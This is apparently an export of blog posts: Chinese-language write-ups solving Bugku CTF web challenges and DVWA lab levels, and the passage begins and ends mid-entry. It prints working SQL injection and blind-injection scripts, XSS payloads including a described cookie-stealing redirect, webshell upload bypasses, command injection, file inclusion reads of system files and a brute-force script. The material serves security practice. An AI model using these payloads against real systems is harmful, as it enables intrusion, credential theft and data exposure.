&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;br&gt; &lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php } $KEY=&apos;ISecer:www.isecer.com&apos;; ?&gt; 然后开始审计代码发现，这是个php反序列。 $cookie = $_COOKIE[&apos;ISecer&apos;]; 代码逻辑就是，传入一个cookie：ISecer，如果ISecer反序列化的结果和KEY相等，就弹出flag。也就是cookie的参数的值必须为$kEY的值的序列化。注意$key的值在调用的时候还没有被定义构造序列化字符串 &lt;?php echo serialize(&apos;&apos;); ?&gt; 输出s:0:’’ 然后我们抓包将Cookie的值改为ISecer=s:0:’’，即可得出flag 五、第43题（sql2）该题为post型的sql注入，尝试了各种sql注入发现都被过滤了，当时那个绝望呀。去看别人博客提示说是DS_Store源码泄露，然后就需要用到python脚本来跑一下了，发现了flag目录，直接访问，然后就得到了flag。DS_Store下载地址：https://github.com/lijiejie/ds_store_exp 我们了解下什么是DS_Store源码泄露 六、第45题（Trim的日记本）登入，额发现题目的出了点问题，不够不影响我们解题，扫描登录http://123.206.87.240:9002/show.php提交flag竟然是真的。 七、第46题（login2）第一步抓包可以发现这边有一堆base64加密的编码解密 $sql=&quot;SELECT username,password FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot;; if (!empty($row) &amp;&amp; $row[&apos;password&apos;]===md5($password)){ 这段代码的意思大概就是，通过输入不存在用户，用union select 构造出指定密码的md5值，即可登入成功username=1’ union select 1,md5(1)#&amp;password=1 八、第47题（login3）我们先尝试下账号admin密码pass,发现返回密码错误。账号admin’,密码pass发现说明本题应该使用布尔盲注再构造语句，进行几次的基于bool盲注的注入，查看一下有没有绕过一些特殊的语句 username=’^(1)^1#&amp;password=123在测试过程中，发现过滤了 ‘空格’ 以及 ’=‘ ，则空格可以使用 () 代替，=可以使用 &lt;&gt; 代替,还有and information。那么我们应该想到使用脚本，毕竟手动盲注什么时候是个头，然后将得到的密码MD5解密附上脚本代码 import requests guess = &quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/=&quot; url = &quot;http://123.206.31.85:49167/&quot; database=&quot;&quot; for i in range(0,35): for j in guess: # uname = &quot;admin&apos;^(ascii(mid(database()from(%i)))&lt;&gt;%s)^0#&quot;%(i,ord(j)) uname = &quot;admin&apos;^(ascii(mid((select(password)from(admin))from(%i)))&lt;&gt;%s)^0#&quot;%(i,ord(j)) data = { &quot;username&quot;:uname, &quot;password&quot;:&quot;123&quot; } res = requests.post(url=url,data=data).text if &quot;password error&quot; in res: database += j print(database) break 大家也可以参考下这篇文章https://blog.csdn.net/qq_42133828/article/details/86815663 九、第48题（login4）经过尝试发现题目说只有admin可以看到flag又说admin不允许登录参考这篇文章https://blog.csdn.net/csu_vc/article/details/79619309 十、文件上传2（湘桥杯）不知道为什么进不了题目大家可以参考下这篇文章https://www.jianshu.com/p/59730b290120 十一、秋名山老司机直接用python脚本即可得出flag #coding:utf-8 import requests import re url = &quot;http://123.206.87.240:8002/qiumingshan/&quot; res = requests.session() s = res.get(url).text num = re.search(r&apos;(\d+[+\-*])+(\d+)&apos;,s).group() result = eval(num) data = {&apos;value&apos;:result} print(res.post(url=url,data=data).text)]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku-29-36 writeup(web)]]></title>
    <url>%2F2019%2F04%2F08%2Fbugku-29-36%2F</url>
    <content type="text"><![CDATA[一、第29题login1(SKCTF)打开题目，发现是一个管理登入界面。且题目提示我们这是到sql约束攻击的题目。那么我们先简单介绍下什么是sql约束攻击 (1)、约束SQL注入的原理就是利用的约束条件，比如最长只能有10个字符的话，如果你输入的是aaaaaaaaaabb(12位），那么保存在数据库里的就是aaaaaaaaaa(10位)，那么别人用aaaaaaaaaabb注册一个用户名，就可以登陆。 （2）、还有一个可以利用的地方就是SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的，也就是说”abc”==”abc “，同样我们可以通过注册用户名为”abc “的账号来登陆”abc”的账号。 我们先注册下,账号为admin,密码随意，发现用户已经存在，那么我们使用账号为admin+一个空格,密码任意，注册，然后登入发现，成功得到flag. 二、第30题（你从哪里来）打开题目发现，题目有一行字，你来着Google吗。那么我们应该想到http头部的referer参数 referer参数的作用简单说就是告诉服务器我是从哪个页面链接过来的 我们抓包添加referer参数即可得到flag。 三、第31题（md5 collision）打开题目，题目要求我们传输参数a,我们传入参数a的值为1，发现输错false.那么我们考虑题目所提到的MD5碰撞，首先我们先介绍下什么是MD5碰撞 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。 下面是常见的0e开头的md5和原值：0e开头的md5和原值： s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 更多的大家可以自己去百度 上面的那些0E开头的字符串都可以作为参数的值传入，如 http://123.206.87.240:9009/md5.php?a=s878926199a 四、第32题（程序员本地网站）打开题目发现，题目里写着请从本地访问。那么我们应该想到http头部的X-Forwarded-For参数 我们先介绍下X-Forwarded-For参数X-Forwarded-For: 简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。 我们抓包进行添加X-Forwarded-For参数，即可得出flag 五、第33题（各种绕过哟）进入这道题我们通过阅读php代码，我们发现只要使uname的sha1和值与passwd的sha1的值相等即可，但是同时他们两个的值又不能相等，我们尝试构造数组。成功得出flag 六、第34题（web8）根据题目提示的txt.并且分析源码我们可以得出以下几点有用信息1、f的值从fn文件中取出2、ac的值和类型与f的值和类型完全相等时，即可得出flag 寻找flag, http://123.206.87.240:8002/web8/flag.txt 可以看出flag.txt的文件的内容为flags那么我们让fn指向flag.txt文件，ac为该文件的内容；构造payload http://123.206.87.240:8002/web8/?ac=flags&amp;fn=flag.txt 七、第35题（细心）首先打开题目发现是一个404 not found 查看源码并没有什么发现。想到题目的提示 想办法变成admin，那么我们使用御剑工具扫描下后台，发现robots.txt文件robots.txt文件简单说就是网络爬虫规则访问robots.txt文件，发现resusl.php文件访问resusl.php文件发现，题目提示我们不是管理员，需要传入参数x那么我们传入参数x=admin 八、第36题（求getshell） 把请求头里面的Content-Type字母改成大写进行绕过 .jpg后面加上.php5其他的都被过滤了好像 content-Type的值改为image/jpg（题目要求我们传入image） 如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 26-27 writeup(web)]]></title>
    <url>%2F2019%2F03%2F19%2Fbugku-26-27%2F</url>
    <content type="text"><![CDATA[一、第26题（过狗一句话）打开链接发现一篇空白，抓包也没什么发现。那么我们只能分析上面那段代码了explode()函数就是把$poc变量用#号来分割开来。那么$poc_2就是assert,他和最后一句代码构造成了assert()函数,assert函数功能跟eval类似，可以把里面的内容当作代码来执行。 那么我们构造payload为?s=print_r(scandir(&#39;./&#39;))，扫描出描本级目录下的文件。（这其实是一种xss攻击）发现了flag_sm1skla1.txt文件。访问该文件即可得出flag拓展：我们扫描上级目录 http://123.206.87.240:8010/?s=print_r(scandir(%27../%27)) 根据目录结构应该是linux系统，hosts文件应该在etc里面 http://123.206.87.240:8010/?s=print_r(readfile(%27../etc/hosts%27)) 一、第27题（字符？正则？）打开题目，是一段代码 &lt;?php highlight_file(&apos;2.php&apos;); $key=&apos;KEY{********************************}&apos;; $IM= preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match); if( $IM ){ die(&apos;key is: &apos;.$key); } ?&gt; 分析这段代码可以发现，只要我们构造出一个符号条件的KEY作为参数传入即可得到flag,突然发现我的正则学了和没学一样。 这边先介绍下 preg_match — 执行一个正则表达式匹配 preg_match ( $pattern , $subject , $matches ) 搜索subject与pattern给定的正则表达式的一个匹配. 参数 ： pattern : 要搜索的模式，字符串类型(正则表达式)。subject : 输入的字符串。matches :（可有可无）如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。 返回值 ： preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。 实例1： $label = &apos;content/112&apos;; $a = preg_match(&apos;#content/(\d+)#i&apos;, $label, $mc); var_dump($a); var_dump($mc); 输出： int(1) array(2) { [0]=&gt; string(11) &quot;content/112&quot; [1]=&gt; string(3) &quot;112&quot; } 开始分析下题目中的正则表达式定界符：/和/（一般来说是这两个，其实除了\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）； . （一个点）：表示可以匹配任何字符； * ：前面的字符重复零次或多次； {n,m} ：最少匹配 4 次且最多匹配 7 次，结合前面的 . 也就是匹配 4 到 7 个任意字符; \ （反斜线）：后面的字符被转义； [a-z] ：在a到z中匹配 ； [[:punct:]] ：匹配任何标点符号； /i ：表示这个正则表达式对大小写不敏感； 我们构造id=keykeyaaaakey:/a/keyz;]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 22-24 write up（web）]]></title>
    <url>%2F2019%2F03%2F19%2Fbugku-22-24%2F</url>
    <content type="text"><![CDATA[一、第22题（速度要快)首先我们查看源码 &lt;/br&gt;我感觉你得快点!!!&lt;!-- OK ,now you have to post the margin what you find --&gt; 发现有post需要提交，参数为marign 那么我们开始抓包，然后发现是base64编码的flag,解码后，输入flag,发现flag错误。额，我们再次抓包，发现flag又变化了。怪得题目说我觉得你得快点。我有尝试了几次发现还是不行，看来只能借助python脚本了 import requests import base64 url = &apos;http://123.206.87.240:8002/web6/&apos; s = requests.session() flag = s.get(url).headers[&apos;flag&apos;] # flag在响应头里 #为了下面使用split不报错，ba64decode操作的对象是byte类型的字符串，而split函数要用str类型 flag = base64.b64decode(flag).decode() flag = base64.b64decode(flag.split(&quot;:&quot;)[1]).decode() # 获取flag后的值 payload = {&apos;margin&apos;: flag} print(s.post(url, data = payload).text) # post方法上传 python中str是经过编好码的字符串，如unicode,gb2312,ascii编码，可以表示不同语言中的字符，可以解码成bytebyte是字节，只能是ascii码0-255的字符，表示未经编码处理的原始字符串 split函数简单的介绍 str与byte的简单的转化方法： flag=flag.decode()//byte转为str flag=flag.encode()//str转为byte 二、第23题（cookie欺骗）http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=打开题目发现，filename参数后面是一串base64编码，进行解码得keys.txt.我们把index.php进行base64编码后放在filename参数的后面，进行输入 http://123.206.87.240:8002/web11/index.php?line=1&amp;filename=aW5kZXgucGhw 改变line后面的数字即可一行一行的输出index.php的内容这样子太慢了，我们写个python脚本来实现。 import requests def getHTMLText(url): try: r = requests.get(url,timeout=30) r.raise_for_status() r .encoding = r.apparent_encoding return r.text except: return&quot;产生异常&quot; if __name__==&quot;__main__&quot;: a=30 for i in range(a): url = &quot;http://123.206.87.240:8002/web11/index.php?line=&quot;+str(i)+&quot;&amp;filename=aW5kZXgucGhw&quot; print(getHTMLText(url)) 输出index.php的网页源码 &lt;?php error_reporting(0); $file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;); $line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0; if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;); $file_list = array( &apos;0&apos; =&gt;&apos;keys.txt&apos;, &apos;1&apos; =&gt;&apos;index.php&apos;, ); ​ if(isset($_COOKIE[‘margin’]) &amp;&amp; $_COOKIE[‘margin’]==’margin’){ $file_list[2]=&apos;keys.php&apos;; } if(in_array($file, $file_list)){ $fa = file($file); echo $fa[$line]; } ?&gt; 这段代码的意思是flag在keys.php文件里，我们需要传入cookie:margin=margin才可以看到源码。进行操作后发现是空白，我们查看源码发现了flag 三、第24题（never give up）查看源码发现那么我们访问http://123.206.87.240:8006/test/1p.html发现是bugku的主页，被重定向了。那么我们使用 view-source:http://123.206.87.240:8006/test/1p.htm 直接访问源码，发现源码中有一部分被url编码了，那么我们进行解码，发现是base64编码，再解码发现是url编码，那么我们再解码，终于得出了以下关键的部分 &quot;;if(!$_GET[&apos;id&apos;]) { header(&apos;Location: hello.php?id=1&apos;); exit(); } $id=$_GET[&apos;id&apos;]; $a=$_GET[&apos;a&apos;]; $b=$_GET[&apos;b&apos;]; if(stripos($a,&apos;.&apos;)) { echo &apos;no no no no no no no&apos;; return ; } $data = @file_get_contents($a,&apos;r&apos;); if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4) { require(&quot;f4l2a3g.txt&quot;); } else { print &quot;never never never give up !!!&quot;; } ​ ?&gt; 看下这部分源码发现有很多要求才可以看到flag,那么尝试下直接访问 http://123.206.87.240:8006/test/f4l2a3g.txt 看到flag了。]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 17-20 write up（web）]]></title>
    <url>%2F2019%2F03%2F14%2Fbugku-17-20%2F</url>
    <content type="text"><![CDATA[一、第17题（输入密码查看flag）。暴力破解，可得密码，然后输入密码可得flag 二、 第18题(点击一百万次)查看源码可以发现，url以post的方式提交点击的次数，那么使用hacker的post功能，直接修改clicks=1000000,即可得出flag 三、第19题（备份是个好习惯）小知识：备份文件的扩展名一般为*.swp，.bak打开题目是一串字母，应该是MD5加密我们拿去解密下，竟然为空。看看题目的提示，备份是个好习惯，是让我们寻找 .bak文件的我们用御剑扫描后台，得出那么尝试下http://123.06.87.240:8002/web16/index.php.bak成功下载源码 &lt;?php /** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */ include_once &quot;flag.php&quot;; ini_set(&quot;display_errors&quot;, 0); $str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);//代码从?后开始截取到str中，也就是变量后开始截取字符串 $str = substr($str,1);//取$str中左边第1位开始取1位。 $str = str_replace(&apos;key&apos;,&apos;&apos;,$str);//在字符串$str中找到字符串key，并把它替换成空； parse_str($str);//把查询字符串解析到变量中； echo md5($key1); echo md5($key2); if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){ echo $flag.&quot;取得flag&quot;; } 代码要求我们构造出key1和key2的md5值相等，而它们本身却不相等，这时候用到一个小知识点：md5无法对数组进行构造，构造的结果都为NULL，这样我们只要让key1和key2是两个数组就可以了，（kekeyy绕过过滤key） 四、第20题（成绩单）在这里插入代码片我们先输入1发现输出输入-1发现没有输出信息说明存在sql注入。那么我们尝试下输入 -1&#39; union select 1,2,3,database()#发现flag的所在的数据库输入-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#爆出flag所在的表 输入-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;#爆出flag所在的字段 输入-1&#39; union select 1,2,3,skctf_flag from fl4g# 爆出flag为BUGKU{Sql_INJECT0N_4813drd8hz4}]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA之xss]]></title>
    <url>%2F2019%2F03%2F14%2FDVWA-xss%2F</url>
    <content type="text"><![CDATA[一、反射（reflected）型（一）、尝试low等级输入正常数字，返回以下内容再输入&lt;xss&gt;发现，只输出了hello我们使用火狐的开发者工具查看下元素发现hello的后面是一对xss标签我们进行弹窗测试输入&lt;script&gt;alert(/xss/)&lt;/script&gt;发现弹窗，说明存在xss注入介绍javaScript的3个弹窗函数alert() ,confirm() ,prompt()攻击者思路攻击者web设计构造估计的js脚本 document.location就是页面的内容定位到指定的位置，他会访问参数中的地址，参数里面写上刚刚新建的php文件的网址，document.cookie就是赋值给这个php的cookie参数，这个cookie值最终会出现在网站127.0.0.1/cookie.php中构造并发送攻击url这样子还不行还需要url编码最后劫持会话修改cookie，修改为之前获取的cookie值。 （二）、尝试medium等级，只要在&lt;srcipt&gt;标签中插入一个&lt;script&gt;即可，&lt;src&lt;srcipt&gt;ipt&gt;，因为他过滤了&lt;sript&gt;标签其他步骤与low等级一样。（三）尝试high等级。上面的方法都失效了，那么我们想到了img标签也是可以执行js代码的 &lt;img src= x onerror=alert(1)&gt; 使用iframe标签也可以成功注入&lt;iframe onload=alert(1)&gt;说明只过滤了script标签（四）impose等级查看源码发现htmlspecialchars函数那么这是函数是干啥的呢？可以把 &amp;过滤成&amp;amp; &quot;过滤成&amp;quto; &apos;过滤成&amp;apos; &lt;过滤成&amp;lt; &gt;过滤成&amp;gt; 二、存储型（stored）反射（一）、尝试low等级，使用火狐浏览器开发者工具，发现name被限制为10个字符，message被限制为50个字符.这对我们xss注入是不够的。那么我们就抓包发送name,message参数成功绕过了限制存储型的数据是存在数据库里，大家可以选择setup/resetDB重置数据库，清楚数据（二）尝试medium等级发现name过滤alert ,和script标签，message过滤了script标签。尝试script大小写发现无法弹窗这个是部分源码我们尝试iframe标签 txtName=&lt;iframe onload=alert(/xss/)&gt;&amp;mtxMessage=&lt;iframe src =1 onload=alert(/ss/)&gt;&amp;btnSign=Sign+Guestbook 发现name成功弹窗,但是message不行，不过没关系，可以进行xss注入 （三）、尝试high等级和medium的方法一样，不同是high等级的message对&lt; &gt; “ &amp; ‘进行了处理（四）、尝试impose等级查看源码name和message都对&lt; &gt; \” &amp; \’进行了过滤 三、DOM型XSS（一）、尝试low等级我们尝试注入 http://localhost/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert(/hack/)&lt;/script&gt; 成功进行注入，查看源码发现，没有任何保护措施（二）、尝试medium等级发现low等级的方法已经失效了，经过尝试可以发现，script标签被过滤了，过滤成English。查看源码发现只过滤了script标签那么我们尝试 下&lt;img src= x onerror=alert(1)&gt;页面没有反应查看网页源代码，发现我们的语句被插入到了value值中，但是并没有插入到option标签的值中，使用img标签没有发挥作用我们尝试闭合option `http://localhost/DVWA/vulnerabilities/xss_d/?default= &gt;&lt;/option&gt;&lt;img src= x onerror=alert(1)`&gt; 发现还没没有闭合成功。我们闭合用的&gt;&lt;被闭合到option的值当中去了。那么我们往更高一层的select标签闭合 http://localhost/DVWA/vulnerabilities/xss_d/?default= &gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&apos;hhh&apos;)&gt; 成功注入（三）、尝试high等级尝试了一番之后没有结果我们查看下源码，发现源码使用了白名单的方法，那我们是不是可以使用#注入，第一次从本地写入，第二次刷新的时候执行我们注入的xss http://localhost/DVWA/vulnerabilities/xss_d/?default=English#&lt;/option&gt;&lt;/select&gt;&lt;BODY ONLOAD=alert(document.cookie)&gt; 成功注入 （四）、impose等级发现我们输入什么都会在客户端体现，查看源码发现在客户端进行了保护。这段代码的功能是不会对URL输入进行URL编码过的内容再进行URL解码从而杜绝了DOM型XSS，这就是为什么我们输入什么就会在框中体现]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[file upload]]></title>
    <url>%2F2019%2F03%2F14%2Ffile-upload%2F</url>
    <content type="text"><![CDATA[一、尝试low等级我们上传一个phpinfo.php文件，文件内容为&lt;?php echo pphpinfo()?&gt;,把路径拼接起来，输入 http://localhost/DVWA/hackable/uploads/phpinfo.php 成功获得执行我们上次的文件我们再上传个一句话木马文件然后直接尝试系统命令 http://localhost/DVWA/hackable/uploads/cmd.php ?cmd=system(&apos;net user&apos;); 二、尝试medium等级上传一句话木马文件，发现报错，只支持jpeg和png格式的图片那么我们抓包看看，上传成功和上传不成功的包有什么差别，然后就是不断的尝试，不端地把上传不成功的包与上传成功的不同之处改成和上传成功的包相同，然后重新发送，发现了破解的办法上传cmd.php文件，然后把文件类型改为imag/jpeg，重新发送就可以了。三、high等级前面的方法都不能用了。尝试了文件后缀名和文件内容发现都失败了那么我们就想到了”制作内涵图“，就是把文件和图片合并成一张图片在cmd窗口下用命令结合 copy 1.jpg/b +1.txt/a 2.jpg 结合成2.jpg我们用编辑器打开，在文件末尾发现了我们的一句话木马 那既然传上去了，那么我们要怎么用呢首先我们需要切换下服务器，切换成nginx在phpini配置文件里把下面这个参数改为一，默认是1然后输入http://localhost/DVWA//hackable/uploads/2.jpg/2.php即可上传]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[file includes]]></title>
    <url>%2F2019%2F03%2F14%2Ffile-includes%2F</url>
    <content type="text"><![CDATA[一、前置知识1、什么是文件包含一种代码处理方法，函数如include,require等，参数是文件名。2、文件包含漏洞文件名的参数用户可控且过滤不严，被攻击者偷梁换柱 二、尝试low等级打开文件包含题目会发现以下提示，我们找到php.ini配置文件（一般在安装目录里），把 allow_url_include的值改成on，然后重启phpstudy即可The PHP function allow_url_include is not enabled我们点击文件一、文件2、文件3、发现了下图的规律。那么我们尝试下输入 http://localhost/DVWA/vulnerabilities/fi/?page=test.php 那么我们就可以利用这个漏洞了，输入 http://localhost/DVWA/vulnerabilities/fi/?page=..\..\php.ini ..\的意思是返回上一级目录。因为php.ini在DVWA目录下，所以使用..\..\ 直接输出了这个文件的内容 那么问题又来了，读取其他目录的php脚本会怎样，显示内容还是执行php代码 输入 http://localhost/DVWA/vulnerabilities/fi/?page=..\..\phpinfo.php 这说明了文件包含不仅仅显示内容还会执行文件。 那什么会执行远程文件吗？我们再次尝试可以执行并且非php文件里面只要包含php代码就可以执行 那么问题又来了。远程执行php文件和非php文件有什么差别吗？当然有了，以上面的phpinfo.php和phpinfo.txt为例，进行说明phpinfo.php是在攻击者的web服务器上执行，这毫无意义，我们期望的是在受害者的web服务器上执行，所以phpinfo.txt才是正解，（phpinfo.txt在受害者的web服务器上执行） 三、尝试medium等级用low等级的方法发现依然成功。但是他和low的等级有什么差别吗差别在于它过滤了../而low的等级没有。第一张图为low等级，第二张图为medium等级代码。可以发现差别在于str_place()函数他把我们传入的参数中的../和..\&quot;替换成了空。还有https://和http://替换成了空 那么medium等级的远程文件可以执行吗。当然可以了既然过滤了http://那么我们可以使用httphttp://://如下图 四、high等级我们尝试了medium等级的方法，进行本地文件执行发现以下错误经常一番尝试发现只执行以file开头的文件。那么这里就不得不提到file协议了 那么什么是files协议呢就是文本传输协议，访问本地计算机中的文件 输入 http://localhost/DVWA/vulnerabilities/fi/?page=file://F:\php\PHPTutorial\WWW\DVWA\phpinfo.php file://后面是本地路径，成功执行本地文件也可以查看系统文件 http://localhost/DVWA/vulnerabilities/fi/?page=file://C:\windows\win.ini 那么怎样进行远程文件执行呢medium方法不可以，查看源码，可知用fnmatch()函数限制参数文件的开头进入impose等级那么要如何远程执行呢，要就有把文件放在图片里，然后上传到web服务器，怎么把文件放在图片里这篇博客里的high等级部分说明了]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Brute Force]]></title>
    <url>%2F2019%2F03%2F09%2FBrute-Force%2F</url>
    <content type="text"><![CDATA[一、 第一题先从难度是low的开始。我们尝试了下admin’# 直接把密码注释掉，成功破解。我们尝试下medium等级还是尝试了下admin’#，发现密码错误，看来这个漏洞被防护了 首先我们抓包看下http请求头的信息，发现可以在http头部看到看到我们提交的账号密码，既然这样我们使用owasp zap 软件暴力破解。这是我使用的字典，大家可以去百度搜索更多的字典暴力成功破解出账号密码。下面我们尝试high等级，发抓包发现多了个user_token(它的职责是保护用户的用户名及密码多次提交，以防密码泄露。)且每一次的user_take会被记录到下一次请求头里的referrer里。这样上面的方法我们就不能使用了。但是认真观察，我们可以发现第一次进登录页面是没有user_token，这就是突破口。那么就可以一直在登录界面和第一次登录进行破解。还有一种思路是虽然加了user_token,但是并没有对尝试的次数进行限制，我们可以先获取user_token，然后用user_token加上用户密码验证身份。我们使用python脚本自动化爆力破解(第二种思路)。 from bs4 import BeautifulSoup import requests header={ &apos;GET&apos;: &apos;http://localhost/DVWA/vulnerabilities/brute/ HTTP/1.1&apos;, &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&apos;, &apos;Accept&apos;:&apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;, &apos;Accept-Language&apos;:&apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;, &apos;Referer&apos;:&apos;http://localhost/DVWA/vulnerabilities/brute/&apos;, &apos;cookie&apos;:&apos;PHPSESSID=8fbhto539r4fnjt4dduolvikj3; security=high&apos;, &apos;Connection&apos;:&apos;keep-alive&apos;, &apos;Upgrade-Insecure-Requests&apos;:&apos;1&apos;, &apos;Host&apos;:&apos;127.0.0.1&apos; } requrl=&quot;http://127.0.0.1/DVWA/vulnerabilities/brute/&quot; def get_token(requrl,header): response=requests.get(url=requrl,headers=header) print (response.status_code,len(response.content)) soup=BeautifulSoup(response.text,&quot;html.parser&quot;) input=soup.form.select(&quot;input[type=&apos;hidden&apos;]&quot;) #返回的是一个list列表 user_token=input[0][&apos;value&apos;] #获取用户的token return user_token user_token=get_token(requrl,header) i=0 for line in open(&quot;password.txt&quot;): requrl=&quot;http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token i=i+1 print (i , &apos;admin&apos; ,line.strip(),end=&quot; &quot;) user_token=get_token(requrl,header) # 尝试次数 if(i==20): break ) 我们继续查看impose等级，发现输错3次就被限制15分钟无法登入。那么还有什么是可以防止暴力破解的呢？还有验证码。]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[command injection]]></title>
    <url>%2F2019%2F03%2F09%2Fcommand-injection%2F</url>
    <content type="text"><![CDATA[一、什么是命令注入1、概念通过web应用程序在服务器上拼接系统命令。简单说就是注入的命令是系统命令，而注入是靠连接来完成的。常见的windows命令：ipconfig，查看本地网络net user,查看系统用户 dir “./ ” 查看当前目录 等等常见的命令拼接符有&amp;&amp;, &amp; ,|, || 二、尝试low等级输入127.0.0.1发现输出的内容就是在cmd执行ping命令的结果，也就是说它调用了系统命令，于是我们尝试下输入127.0.0.1 &amp; net user注入成功 三、尝试medium等级 四、尝试下high等级发现注入，那么我们采用 | 连接，发现注入成功我们查看源码，发现了原因 五、尝试下impose等级发现它现在了我们的IP格式，这就是所谓的白名单，可以有效的防止命令注入。不推荐黑名单，应该可以通过双引号，略过黑名单。linux下还支持单引号 如果不输出显示结果怎么办]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 12-16 write up(web)]]></title>
    <url>%2F2019%2F03%2F09%2Fbugku-12-16%2F</url>
